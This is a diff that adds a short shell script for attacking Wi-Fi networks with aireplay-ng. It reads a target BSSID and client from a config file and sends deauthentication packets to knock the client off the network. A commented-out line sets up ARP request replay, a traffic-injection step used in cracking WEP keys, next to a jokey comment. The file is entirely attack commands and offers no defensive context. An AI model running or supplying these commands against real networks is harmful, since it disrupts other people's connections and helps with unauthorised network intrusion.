@@ -1,0 +1,10 @@
+#!/bin/sh
+. ./config
+
+# deauth
+aireplay-ng -0 5 -a $bssid -c $client wlan0
+
+# get your sassy self into ARP request replay mode.
+# (routers just *love* rebroadcasting ARP packet)
+#aireplay-ng -3 -b $bssid -h $mymac $interface
+
